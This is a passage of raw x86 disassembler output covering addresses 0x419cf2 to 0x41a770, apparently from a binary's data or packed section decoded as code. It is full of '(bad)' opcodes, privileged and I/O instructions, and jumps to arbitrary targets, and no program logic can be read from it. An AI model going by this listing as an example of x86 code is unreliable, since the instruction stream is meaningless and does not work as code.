  419cf2:	mov    edx,0x99980d1c
  419cf7:	ss pop eax
  419cf9:	dec    esi
  419cfa:	sbb    edx,esp
  419cfc:	test   DWORD PTR [ebx+0x3f315d61],esp
  419d02:	xchg   esi,ebp
  419d04:	and    bl,BYTE PTR [eax+edx*4]
  419d07:	dec    edx
  419d08:	pop    ebp
  419d09:	test   ecx,ebx
  419d0b:	or     ecx,DWORD PTR [esi]
  419d0d:	in     al,0xc1
  419d0f:	or     DWORD PTR [ebx+0x41ca4f23],edx
  419d15:	dec    ebx
  419d16:	(bad)  
  419d17:	retf   0x3ba3
  419d1a:	cmp    edx,DWORD PTR [ecx]
  419d1c:	or     eax,0xe3940e48
  419d21:	(bad)  
  419d22:	rcl    bl,cl
  419d24:	dec    esp
  419d25:	arpl   dx,cx
  419d27:	bound  esp,QWORD PTR [ebx+0x10f1f4da]
  419d2d:	mov    es,WORD PTR [esi+0x1681fe45]
  419d33:	dec    eax
  419d34:	or     BYTE PTR [edi-0xb],al
  419d37:	je     0x419ced
  419d39:	jno    0x419cbb
  419d3b:	and    BYTE PTR [esi+0x456158a7],al
	...
  419db1:	add    BYTE PTR [eax],al
  419db3:	add    BYTE PTR [esi],cl
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	sub    dl,dh
  419dc2:	iret   
  419dc3:	bound  eax,QWORD PTR [ebp+0x18]
  419dc6:	add    DWORD PTR [eax],eax
  419dc8:	cmc    
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    ch,bh
  419dcd:	and    eax,0x62c47ad
  419dd2:	(bad)  
  419dd3:	pop    ds
  419dd4:	lock or al,bh
  419dd7:	jmp    0xa7585e72
  419ddc:	mov    ecx,0x4952324f
  419de1:	bound  edi,QWORD PTR [eax+0x44]
  419de4:	pop    esp
  419de5:	addr16 jp 0x419e40
  419de8:	mov    dh,0x99
  419dea:	bnd ja 0x419dac
  419ded:	aaa    
  419dee:	les    esp,FWORD PTR [esi-0xf]
  419df1:	xchg   ebp,eax
  419df2:	sbb    bl,BYTE PTR [esi]
  419df4:	pop    esi
  419df5:	ins    BYTE PTR es:[edi],dx
  419df6:	retf   0x3c8c
  419df9:	cld    
  419dfa:	jnp    0x419e3f
  419dfc:	jecxz  0x419e1d
  419dfe:	enter  0x18c3,0x7e
  419e02:	or     BYTE PTR [ebp+0x72],dl
  419e05:	cld    
  419e06:	dec    esp
  419e07:	jl     0x419df2
  419e09:	jmp    0x171c:0xa118afb9
  419e10:	addr16 mov ch,0xcf
  419e13:	lods   eax,DWORD PTR ds:[esi]
  419e14:	sbb    DWORD PTR [ecx-0x2b180b86],esp
  419e1a:	sub    DWORD PTR [ecx-0x3bcaf210],eax
  419e20:	retf   
  419e21:	xchg   ebx,eax
  419e22:	mov    esp,0xc621b73d
  419e27:	ss xchg ebp,eax
  419e29:	pop    ss
  419e2a:	int    0x6a
  419e2c:	imul   esi,ebp,0x17e2bc15
  419e32:	in     al,0x58
  419e34:	xchg   edi,eax
  419e35:	xor    al,0x82
  419e37:	mov    esp,0xd692512e
  419e3c:	sbb    dl,BYTE PTR [eax-0x2c36348]
  419e42:	xor    al,0xf0
  419e44:	jle    0x419e10
  419e46:	test   BYTE PTR [ecx],ah
  419e48:	lahf   
  419e49:	stos   DWORD PTR es:[edi],eax
  419e4a:	loopne 0x419eaa
  419e4c:	leave  
  419e4d:	pop    esi
  419e4e:	test   BYTE PTR fs:[ebx+0x5449a1d3],0x25
  419e56:	fcmove st,st(2)
  419e58:	sbb    DWORD PTR [ebx+0x66c9affd],eax
  419e5e:	cli    
  419e5f:	lods   eax,DWORD PTR ds:[esi]
  419e60:	and    al,0x3d
  419e62:	pop    esi
  419e63:	pop    edx
  419e64:	xor    DWORD PTR [ecx],ecx
  419e66:	sub    DWORD PTR ds:[ebx-0x33],edx
  419e6a:	xchg   edi,eax
  419e6b:	aad    0xd4
  419e6d:	sub    bh,BYTE PTR [esi-0x5a911d08]
  419e73:	or     al,0x65
  419e75:	inc    ecx
  419e76:	push   ebp
  419e77:	xor    eax,0x2c05dff4
  419e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e7d:	(bad)
  419e81:	icebp  
  419e82:	or     dh,ch
  419e84:	popa   
  419e85:	or     DWORD PTR [edi],ebx
  419e87:	pop    es
  419e88:	xor    al,0xab
  419e8a:	pusha  
  419e8b:	xlat   BYTE PTR ds:[ebx]
  419e8c:	mov    eax,0x912b98cc
  419e91:	and    bh,BYTE PTR ds:0x2091d4cb
  419e97:	daa    
  419e98:	fidiv  DWORD PTR [edi+0x1d]
  419e9b:	push   ecx
  419e9c:	xchg   edx,eax
  419e9d:	retf   
  419e9e:	and    bl,BYTE PTR [ecx+0x781f82b9]
  419ea4:	mov    DWORD PTR [esi-0x3],eax
  419ea7:	ret    
  419ea8:	pop    eax
  419ea9:	loopne 0x419e98
  419eab:	and    BYTE PTR [edi],al
  419ead:	pop    es
  419eae:	test   DWORD PTR [ebp-0x27],ebx
  419eb1:	(bad)  
  419eb3:	jmp    0x419e96
  419eb5:	inc    esi
  419eb6:	shl    BYTE PTR [edx-0x2c3d058a],cl
  419ebc:	cmp    al,0xef
  419ebe:	ret    0x2ec4
	...
  419f31:	add    BYTE PTR [eax],al
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx+0x49e0b49]
  419f41:	lahf   
  419f42:	inc    edx
  419f43:	data16 cmp bl,BYTE PTR [ecx]
  419f46:	add    DWORD PTR [eax],eax
  419f48:	cmc    
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    BYTE PTR [ebx+0x38e9d15f],ch
  419f51:	add    eax,0xbae0f786
  419f56:	inc    esp
  419f57:	inc    esi
  419f58:	fwait
  419f59:	adc    al,0x10
  419f5b:	mov    edx,edi
  419f5d:	imul   esp,DWORD PTR [esi-0x5123af5a],0xffffffa6
  419f64:	imul   eax,DWORD PTR [edi+0x60],0xffffff9d
  419f68:	repnz mov cl,0x1b
  419f6b:	out    dx,al
  419f6c:	add    edi,DWORD PTR [ecx]
  419f6e:	call   0xece23fd8
  419f73:	sbb    eax,DWORD PTR [esi-0xd2e9030]
  419f79:	inc    BYTE PTR [eax+0x4209e765]
  419f7f:	push   edx
  419f80:	std    
  419f81:	xor    BYTE PTR [ebp+ebx*8-0x6b],dl
  419f85:	enter  0xa45b,0x43
  419f89:	jp     0x419f4f
  419f8b:	inc    ecx
  419f8c:	xchg   DWORD PTR ds:0xc0476cee,esi
  419f92:	or     esp,edi
  419f94:	push   esi
  419f95:	cmp    BYTE PTR [edx-0x5f],0xde
  419f99:	cdq    
  419f9a:	xchg   edx,eax
  419f9b:	lahf   
  419f9c:	jnp    0x419fd0
  419f9e:	retf   
  419f9f:	(bad)  
  419fa0:	lea    eax,[esi+eax*1+0x41]
  419fa4:	sub    BYTE PTR [edx+0x7f4e9],ch
  419faa:	fst    st(1)
  419fac:	popa   
  419fad:	sub    al,0xbe
  419faf:	addr16 jno 0x41a01e
  419fb2:	sbb    bh,dh
  419fb4:	ins    BYTE PTR es:[edi],dx
  419fb5:	outs   dx,BYTE PTR ds:[esi]
  419fb6:	jl     0xe42b10a8
  419fbc:	sub    eax,0xc74a749a
  419fc1:	(bad)  
  419fc2:	ins    BYTE PTR es:[edi],dx
  419fc3:	bound  esp,QWORD PTR [edi-0x257646f3]
  419fc9:	test   BYTE PTR [eax+0x5b6084e8],0xa0
  419fd0:	add    al,BYTE PTR [ebp-0x82ea975]
  419fd6:	in     al,0x3a
  419fd8:	pop    ebp
  419fd9:	or     edi,ecx
  419fdb:	sbb    eax,0x96eada54
  419fe0:	and    al,0x1b
  419fe2:	pop    edx
  419fe3:	lds    edx,FWORD PTR [edi+0x2d]
  419fe6:	in     al,dx
  419fe7:	cmp    al,0x66
  419fe9:	or     DWORD PTR [ecx+ebx*1],edi
  419fec:	push   0xd7f112b7
  419ff1:	imul   edi,DWORD PTR [esi+0x3b02eec],0xf
  419ff8:	push   ds
  419ff9:	xor    ebx,DWORD PTR [edx+0x7]
  419ffc:	jge    0x419faf
  419ffe:	fwait
  419fff:	js     0x41a034
  41a001:	xor    al,al
  41a003:	(bad)  
  41a004:	fisub  WORD PTR [esi]
  41a006:	fistp  QWORD PTR [ebx-0x13]
  41a009:	pop    edx
  41a00a:	hlt    
  41a00b:	aad    0x97
  41a00d:	mov    al,ds:0xe9672339
  41a012:	xchg   BYTE PTR [ebx],dh
  41a014:	add    DWORD PTR fs:0x9ee98835,edx
  41a01b:	push   ds
  41a01c:	mov    ebx,0xb4f780c2
  41a021:	rcr    BYTE PTR [eax],1
  41a023:	sbb    ah,dl
  41a025:	call   DWORD PTR [ebx-0x6fb99248]
  41a02b:	sbb    al,0xad
  41a02d:	je     0x41a04b
  41a02f:	in     eax,dx
  41a030:	jl     0x41a026
  41a032:	cmp    eax,0xd205524a
  41a037:	pop    ebp
  41a038:	dec    edx
  41a039:	pop    edx
  41a03a:	out    0xfb,eax
  41a03c:	idiv   dl
  41a03e:	xchg   ebx,eax
  41a03f:	pop    ebp
  41a040:	cmp    eax,DWORD PTR [eax]
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0xfcf604a2
  41a0c2:	mov    edx,0x11a2fc4
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [edx+ebx*1+0x5f],dl
  41a0cf:	push   0x1a
  41a0d1:	jne    0x41a0ad
  41a0d3:	cmp    eax,0xeab2a21d
  41a0d8:	fst    QWORD PTR [esi+0x26]
  41a0db:	and    eax,0x4a1835f8
  41a0e0:	icebp  
  41a0e1:	test   al,0xcd
  41a0e3:	xchg   esp,eax
  41a0e4:	cs push ebp
  41a0e6:	fmul   st,st(7)
  41a0e8:	fadd   DWORD PTR [ecx+0x1a]
  41a0eb:	ret    
  41a0ec:	stos   DWORD PTR es:[edi],eax
  41a0ed:	dec    ebx
  41a0ee:	push   edi
  41a0ef:	mov    edi,0x3dbf066e
  41a0f4:	inc    ebx
  41a0f5:	jae    0x41a0f6
  41a0f7:	mov    bl,0x83
  41a0f9:	xor    al,0x88
  41a0fb:	ret    0xaacd
  41a0fe:	or     al,0x13
  41a100:	outs   dx,BYTE PTR ds:[esi]
  41a101:	ja     0x41a099
  41a103:	lds    ebp,FWORD PTR [eax-0x57]
  41a106:	cmp    al,0xf7
  41a108:	rcl    DWORD PTR ds:0x34e79c93,cl
  41a10e:	mul    BYTE PTR [ecx-0x2d]
  41a111:	out    0xc5,eax
  41a113:	cs aad 0x2
  41a116:	cmc    
  41a117:	gs dec eax
  41a119:	cmp    al,0xea
  41a11b:	loop   0x41a102
  41a11d:	xchg   edi,eax
  41a11e:	jl     0x41a0a7
  41a120:	cs xchg ecx,eax
  41a122:	adc    eax,0x6890c125
  41a127:	inc    esp
  41a128:	repz cwde 
  41a12a:	mov    WORD PTR [ebx-0x49],ds
  41a12d:	stos   DWORD PTR es:[edi],eax
  41a12e:	mov    bh,0xf5
  41a130:	adc    edx,DWORD PTR [edi+ebx*4]
  41a133:	sbb    eax,0x664408cc
  41a138:	xor    eax,ebx
  41a13a:	cmc    
  41a13b:	(bad)  
  41a13c:	ror    edi,1
  41a13e:	js     0x41a196
  41a140:	or     BYTE PTR [esi+0x1b],ch
  41a143:	cmp    al,0x9a
  41a145:	imul   eax,DWORD PTR [ebp+0x25],0xb7a18018
  41a14c:	addr16 inc edx
  41a14e:	xchg   BYTE PTR [ebp+0x19],bh
  41a151:	addr16 push esp
  41a153:	popa   
  41a154:	into   
  41a155:	icebp  
  41a156:	je     0x41a0f4
  41a158:	test   eax,0x6b2dfcd5
  41a15d:	dec    esp
  41a15e:	fnstsw WORD PTR [ebx+0x26]
  41a161:	out    dx,eax
  41a162:	cmp    ecx,eax
  41a164:	sub    al,BYTE PTR gs:[eax-0x74]
  41a168:	retf   0xf778
  41a16b:	mov    bh,0x8d
  41a16d:	mov    esp,0x654c3756
  41a172:	ins    BYTE PTR es:[edi],dx
  41a173:	and    BYTE PTR [ebx],0x96
  41a176:	or     al,BYTE PTR [ebx-0x3]
  41a179:	adc    eax,0xcae67dff
  41a17e:	mov    bh,BYTE PTR [edi+0x16]
  41a181:	dec    ecx
  41a182:	pop    ds
  41a183:	mov    ch,0x27
  41a185:	(bad)  
  41a186:	cmp    BYTE PTR [edi],dl
  41a188:	sub    DWORD PTR [edx],esp
  41a18a:	test   BYTE PTR [edx-0x3e5fedf0],ch
  41a190:	push   es
  41a191:	add    ah,BYTE PTR [edi]
  41a193:	push   eax
  41a194:	out    0x50,al
  41a196:	sub    DWORD PTR [ebx],edx
  41a198:	inc    esp
  41a199:	push   eax
  41a19a:	out    0x29,al
  41a19c:	xor    eax,0xcd490923
  41a1a1:	push   ss
  41a1a2:	inc    edi
  41a1a3:	jge    0x41a1a2
  41a1a5:	xlat   BYTE PTR ds:[ebx]
  41a1a6:	mul    BYTE PTR [esp+eiz*4-0x6a]
  41a1aa:	pop    ss
  41a1ab:	dec    ecx
  41a1ac:	xor    edx,DWORD PTR [ebx]
  41a1ae:	int    0x88
  41a1b0:	fwait
  41a1b1:	rol    DWORD PTR [edi+eiz*2+0x3d],1
  41a1b5:	stos   BYTE PTR es:[edi],al
  41a1b6:	pusha  
  41a1b7:	fsub   QWORD PTR [eax-0x42]
  41a1ba:	sub    DWORD PTR [eax],edi
  41a1bc:	cmp    DWORD PTR [esi+0x5d],esi
  41a1bf:	xchg   ebx,eax
  41a1c0:	add    al,BYTE PTR [eax]
	...
  41a232:	add    BYTE PTR [eax],al
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	test   BYTE PTR [esi+0x244d0627],0x1b
  41a246:	add    DWORD PTR [eax],eax
  41a248:	cmc    
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [edx-0xbf5f46],dl
  41a251:	retf   0x15e
  41a254:	dec    eax
  41a255:	push   ds
  41a256:	test   BYTE PTR fs:[edx+eiz*8+0x64],al
  41a25b:	and    bh,dl
  41a25d:	and    eax,0x16e00307
  41a262:	pop    ds
  41a263:	js     0x41a2a5
  41a265:	scas   al,BYTE PTR es:[edi]
  41a266:	pop    esp
  41a267:	fdivp  st(6),st
  41a269:	adc    dh,BYTE PTR [eax+0x25]
  41a26c:	fcomp  QWORD PTR [ecx]
  41a26e:	mov    ah,0xc8
  41a270:	xchg   ebp,eax
  41a271:	cmp    esi,DWORD PTR [edx-0x67b49e09]
  41a277:	xchg   edi,eax
  41a278:	add    esi,eax
  41a27a:	dec    edi
  41a27b:	push   edx
  41a27c:	in     al,0xa6
  41a27e:	jb     0x4d3b58a9
  41a284:	(bad)  
  41a285:	push   edx
  41a287:	jle    0x41a2e9
  41a289:	xchg   esp,eax
  41a28a:	push   ss
  41a28b:	push   cs
  41a28c:	pop    eax
  41a28d:	wrmsr  
  41a28f:	test   BYTE PTR ds:0x6c24a064,dh
  41a295:	mov    ds:0xefea0476,eax
  41a29a:	jnp    0x41a268
  41a29c:	sbb    dl,BYTE PTR [edi-0x8]
  41a29f:	shl    BYTE PTR [eax-0x7f5cda69],cl
  41a2a5:	outs   dx,DWORD PTR ds:[esi]
  41a2a6:	cmp    ah,BYTE PTR [ecx+eiz*4-0x66]
  41a2aa:	push   esp
  41a2ab:	or     BYTE PTR [ecx+0x391d7a95],ch
  41a2b1:	int3   
  41a2b2:	xchg   ebp,eax
  41a2b3:	lods   al,BYTE PTR ds:[esi]
  41a2b4:	rcl    BYTE PTR ds:0xf1f6b0dc,cl
  41a2ba:	sub    DWORD PTR [esi-0x39],ecx
  41a2bd:	rol    DWORD PTR [eax],cl
  41a2bf:	mov    edx,0x42b62f54
  41a2c4:	mov    ebx,0x5083b9bc
  41a2c9:	gs int 0x9d
  41a2cc:	lea    edi,[esi+0x619ab7cc]
  41a2d2:	ja     0x41a2ae
  41a2d4:	mov    esp,0xeeb430a2
  41a2d9:	das    
  41a2da:	test   DWORD PTR [edx-0x51],esi
  41a2dd:	jne    0x41a313
  41a2df:	sub    BYTE PTR [ebx-0x3aaa70a3],0x29
  41a2e6:	jmp    0x6833:0x920b2694
  41a2ed:	push   esp
  41a2ee:	sub    al,0x63
  41a2f0:	sbb    dl,dl
  41a2f2:	xchg   ebp,eax
  41a2f3:	ficomp WORD PTR [esi-0x2fd133ff]
  41a2f9:	or     al,0x3e
  41a2fb:	jge    0x41a29f
  41a2fd:	push   edi
  41a2fe:	ins    BYTE PTR es:[edi],dx
  41a2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a300:	push   ds
  41a301:	out    dx,eax
  41a302:	ss gs out dx,eax
  41a305:	(bad)  
  41a306:	cmp    eax,0x2beb8f5b
  41a30b:	loopne 0x41a292
  41a30d:	sub    eax,0xfc98041e
  41a312:	pop    ebp
  41a313:	dec    edx
  41a314:	ds daa 
  41a316:	sbb    BYTE PTR [ecx+ebp*1+0x3c],dl
  41a31a:	pusha  
  41a31b:	push   0x9b0c3e5
  41a320:	or     edx,DWORD PTR [esi-0x76]
  41a323:	mov    edx,ebp
  41a325:	std    
  41a326:	outs   dx,BYTE PTR ds:[esi]
  41a327:	call   0xfc88d459
  41a32c:	xor    al,BYTE PTR [esi-0x41]
  41a32f:	mov    ds:0x2b764b79,al
  41a334:	rol    DWORD PTR [ebx+eax*8+0xb],1
  41a338:	test   al,0x7c
  41a33a:	mov    esi,0xf717603b
  41a33f:	and    edx,DWORD PTR [esi+0x0]
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	xchg   esp,eax
  41a3c1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a3c3:	adc    al,0x19
  41a3c5:	sbb    al,0x1
  41a3c7:	add    ch,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ebx-0x6bc3c8f0],ch
  41a3d1:	dec    esi
  41a3d2:	mov    ecx,0x1ef79c67
  41a3d7:	fwait
  41a3d8:	xor    eax,DWORD PTR [ebp-0x1f775903]
  41a3de:	jne    0x41a41a
  41a3e0:	inc    ebp
  41a3e1:	fisub  WORD PTR [edi]
  41a3e3:	jg     0x41a36c
  41a3e5:	mov    ch,0xfd
  41a3e7:	sbb    cl,BYTE PTR [eax]
  41a3e9:	call   0x68aaa7cd
  41a3ee:	out    0x43,al
  41a3f0:	jmp    0x2f26:0x7b97314
  41a3f7:	mov    ?,WORD PTR [eax]
  41a3f9:	pop    es
  41a3fa:	push   0xffffffe4
  41a3fc:	into   
  41a3fd:	jno    0x41a46e
  41a3ff:	fldlg2 
  41a401:	rcr    bh,cl
  41a403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a404:	xor    DWORD PTR [edi+ecx*1],eax
  41a407:	imul   BYTE PTR [esi+edx*2-0x44d15e31]
  41a40e:	xchg   ecx,eax
  41a40f:	push   ebp
  41a410:	sbb    eax,0x14a9a15c
  41a415:	adc    ecx,DWORD PTR [edx+ebp*4]
  41a418:	sub    eax,0x14189ea7
  41a41d:	in     eax,0x8c
  41a41f:	jle    0x41a3ca
  41a421:	pop    esp
  41a422:	sbb    bl,BYTE PTR [eax]
  41a424:	call   0xfa5e0c11
  41a429:	adc    ch,BYTE PTR [esi-0x5bfd5974]
  41a42f:	xor    ch,BYTE PTR [esp+eax*2-0x19]
  41a433:	pop    eax
  41a434:	sbb    bh,ah
  41a436:	js     0x41a3d7
  41a438:	loopne 0x41a41e
  41a43a:	jge    0x41a3c3
  41a43c:	xor    DWORD PTR [ebx],ecx
  41a43e:	imul   edx,DWORD PTR ds:0x80ae01a5,0xffffff8a
  41a445:	pop    ebx
  41a446:	and    DWORD PTR [edi+0x7c],0x69d5416e
  41a44d:	xor    dl,BYTE PTR [edx+0xb]
  41a450:	inc    DWORD PTR [eax+eax*2-0x44b05f60]
  41a457:	call   0x2ad5cbda
  41a45c:	mov    ebp,0x27ba7339
  41a461:	int3   
  41a462:	jmp    0x41a46c
  41a464:	jmp    0x41a4a4
  41a466:	test   DWORD PTR [edi-0x52],ecx
  41a469:	xor    edx,DWORD PTR [ecx+0x6e]
  41a46c:	sub    dh,dh
  41a46e:	inc    esp
  41a46f:	call   0x6d619d83
  41a474:	test   eax,0x47660f86
  41a479:	jp     0x41a4e9
  41a47b:	jb     0x41a4fb
  41a47d:	leave  
  41a47e:	xchg   ebx,eax
  41a47f:	outs   dx,DWORD PTR ds:[esi]
  41a480:	adc    ah,0xe2
  41a483:	mov    ds:0x17eb4f3b,al
  41a488:	sti    
  41a489:	cmp    DWORD PTR [edi],eax
  41a48b:	dec    DWORD PTR [edx-0x2ac14f9a]
  41a491:	mov    ecx,0x5a3ad76b
  41a496:	sub    cl,cl
  41a498:	rcr    BYTE PTR [eax],cl
  41a49a:	jne    0x41a47d
  41a49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a49d:	and    eax,esp
  41a49f:	cwde   
  41a4a0:	jbe    0x41a4d7
  41a4a2:	icebp  
  41a4a3:	dec    edx
  41a4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a5:	imul   esi,edx,0x45
  41a4a8:	sub    DWORD PTR gs:[edx-0x4e],esp
  41a4ac:	adc    DWORD PTR [edx],ebp
  41a4ae:	loop   0x41a49a
  41a4b0:	mov    al,0xcc
  41a4b2:	dec    ecx
  41a4b3:	fst    QWORD PTR [ecx+0x701d3eb9]
  41a4b9:	or     eax,0xd9658e4d
  41a4be:	push   es
  41a4bf:	sahf   
  41a4c0:	fiadd  WORD PTR [eax]
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x69e9e0aa]
  41a541:	loop   0x41a52e
  41a543:	in     eax,0xe
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	retf   
  41a54d:	mov    dl,0x36
  41a54f:	cmp    al,0xb4
  41a551:	or     eax,DWORD PTR [ebx-0x2a]
  41a554:	ins    DWORD PTR es:[edi],dx
  41a555:	push   es
  41a556:	(bad)  
  41a557:	inc    BYTE PTR [ebp-0x41034a3a]
  41a55d:	in     eax,0x5f
  41a55f:	inc    edx
  41a560:	shr    ecx,cl
  41a562:	outs   dx,BYTE PTR ds:[esi]
  41a563:	pop    eax
  41a564:	dec    esp
  41a565:	imul   edx,DWORD PTR [edi-0x37ed3da8],0x16
  41a56c:	jno    0x41a557
  41a56e:	or     eax,0x8af4c59e
  41a573:	push   esi
  41a574:	shl    BYTE PTR [eax-0x1bb00f6e],cl
  41a57a:	aam    0x6e
  41a57c:	gs push ebx
  41a57e:	sub    ebx,DWORD PTR [ebp-0x7c]
  41a581:	jne    0x41a598
  41a583:	sbb    BYTE PTR [edi-0x7c],bh
  41a586:	mov    ebx,0xbab5b4ef
  41a58b:	push   ebx
  41a58c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a58d:	add    cl,bh
  41a58f:	ret    0x9d9f
  41a592:	test   eax,0xb0156db0
  41a597:	push   0x52ac66e8
  41a59c:	aam    0x81
  41a59e:	xlat   BYTE PTR ds:[ebx]
  41a59f:	or     eax,0x8dcea7d4
  41a5a4:	les    edx,FWORD PTR [edx+0x79]
  41a5a7:	xadd   DWORD PTR [edi],eax
  41a5aa:	mov    ecx,0xeeac7e80
  41a5af:	mov    edx,0x3b035b3
  41a5b4:	xor    esp,DWORD PTR [edi+0x10]
  41a5b7:	adc    al,0x12
  41a5b9:	sar    BYTE PTR [edx-0x62a46daf],cl
  41a5bf:	mov    ds:0x6103e020,al
  41a5c4:	and    eax,0xdab0e4bd
  41a5c9:	bound  ebp,QWORD PTR [edx-0x44]
  41a5cc:	arpl   WORD PTR [eax+0x6],sp
  41a5cf:	cli    
  41a5d0:	sbb    eax,0x25ed0676
  41a5d5:	lods   eax,DWORD PTR ds:[esi]
  41a5d6:	jb     0x41a5f6
  41a5d8:	fstp   QWORD PTR [eax]
  41a5da:	pusha  
  41a5db:	jecxz  0x41a629
  41a5dd:	out    dx,eax
  41a5de:	dec    esi
  41a5df:	cwde   
  41a5e0:	les    esp,FWORD PTR [ebp-0x7b]
  41a5e3:	int3   
  41a5e4:	xlat   BYTE PTR ds:[ebx]
  41a5e5:	bound  edi,QWORD PTR ds:[ebx]
  41a5e8:	mov    cl,0x92
  41a5ea:	xor    eax,0x435b1230
  41a5ef:	pop    ecx
  41a5f0:	add    edi,DWORD PTR [edi]
  41a5f2:	mov    ch,0x8
  41a5f4:	jns    0x41a65c
  41a5f6:	ss daa 
  41a5f8:	xchg   edi,eax
  41a5f9:	shl    ebp,cl
  41a5fb:	xchg   edi,eax
  41a5fc:	emms   
  41a5fe:	mov    al,ds:0x85aba9a3
  41a603:	jmp    0x1331:0x8ed4763e
  41a60a:	fcomip st,st(4)
  41a60c:	jp     0x41a653
  41a60e:	mov    BYTE PTR [eax+0x43],dl
  41a611:	call   0x33ac:0xd03e84ff
  41a618:	mov    esi,0x8de507ff
  41a61d:	lods   eax,DWORD PTR ds:[esi]
  41a61e:	sub    DWORD PTR [edi+esi*8+0x1e],ebx
  41a622:	rcl    BYTE PTR [ecx],0x50
  41a625:	retf   0x5205
  41a628:	inc    edi
  41a629:	or     eax,0x72e5ee4d
  41a62e:	add    ebx,DWORD PTR [edx-0x18]
  41a631:	mov    ds:0x2ab046b3,al
  41a636:	mov    bl,0x43
  41a638:	xchg   ecx,eax
  41a639:	adc    DWORD PTR [eax+0x217e71e9],eax
  41a63f:	and    DWORD PTR [edi+0x0],ebp
	...
  41a6b1:	add    BYTE PTR [eax],al
  41a6b3:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x2
  41a6c1:	pop    eax
  41a6c2:	mov    edi,0x11e03b9
  41a6c7:	add    ch,dh
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    BYTE PTR [edi+0x209623a0],cl
  41a6d1:	mov    ds:0x7be09947,eax
  41a6d6:	sbb    BYTE PTR [ebx+0x71],ah
  41a6d9:	mov    edi,0xd81660b7
  41a6de:	cmp    al,0x85
  41a6e0:	or     eax,0x27ac8c4f
  41a6e5:	lods   al,BYTE PTR ds:[esi]
  41a6e6:	lods   al,BYTE PTR ds:[esi]
  41a6e7:	mov    dh,0xe3
  41a6e9:	fwait
  41a6ea:	push   edi
  41a6eb:	aas    
  41a6ec:	or     DWORD PTR [ebx+eiz*2-0x13],edi
  41a6f0:	cmp    eax,0x783d0a8a
  41a6f5:	push   ebp
  41a6f6:	xchg   ebx,eax
  41a6f7:	ins    DWORD PTR es:[edi],dx
  41a6f8:	out    dx,al
  41a6f9:	lock es push cs
  41a6fc:	in     eax,0x6
  41a6fe:	sbb    eax,0x50e96ae7
  41a703:	pop    edx
  41a704:	in     al,dx
  41a705:	xchg   edi,eax
  41a706:	mov    esp,0x5a88fccb
  41a70b:	push   ecx
  41a70c:	sbb    cl,ah
  41a70e:	pop    es
  41a70f:	push   ebp
  41a710:	xchg   DWORD PTR [esi-0x41ca0c32],eax
  41a716:	mov    cl,0x5d
  41a718:	shl    DWORD PTR [ecx],cl
  41a71a:	loop   0x41a76e
  41a71c:	inc    esp
  41a71d:	mov    edx,0x381e34d1
  41a722:	retf   0x317
  41a725:	out    dx,eax
  41a726:	push   eax
  41a727:	inc    ecx
  41a728:	and    BYTE PTR [esi+esi*2+0x7d],al
  41a72c:	arpl   WORD PTR [ecx+0x69],ax
  41a72f:	or     DWORD PTR [edi-0x67],0xc
  41a733:	and    al,0x8c
  41a735:	pop    edx
  41a736:	adc    al,0x13
  41a738:	adc    dh,BYTE PTR [esi+ecx*1-0xbaae853]
  41a73f:	push   ebx
  41a740:	lods   eax,DWORD PTR ds:[esi]
  41a741:	push   ebp
  41a742:	addr16 push ecx
  41a744:	les    edi,FWORD PTR fs:[esi+0x6a2134b3]
  41a74b:	rcl    ebx,cl
  41a74d:	mov    edi,DWORD PTR [esi]
  41a74f:	mov    al,0x6
  41a751:	sbb    BYTE PTR [ebx-0x4d],ch
  41a754:	test   BYTE PTR [ebx+0x2e],dl
  41a757:	pop    esi
  41a758:	mov    ss,WORD PTR [edi]
  41a75a:	xchg   DWORD PTR [eax],edx
  41a75c:	jmp    0x41a775
  41a75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a75f:	mov    ds,WORD PTR [eax]
  41a761:	stos   BYTE PTR es:[edi],al
  41a762:	pop    es
  41a763:	(bad)  
  41a764:	test   BYTE PTR [ecx-0x5b1192f3],bh
  41a76a:	inc    esi
  41a76b:	dec    edx
  41a76c:	inc    esi
  41a76d:	(bad)  
  41a76e:	pusha  
  41a76f:	in     eax,dx
  41a770:	push   0xff5dbf23
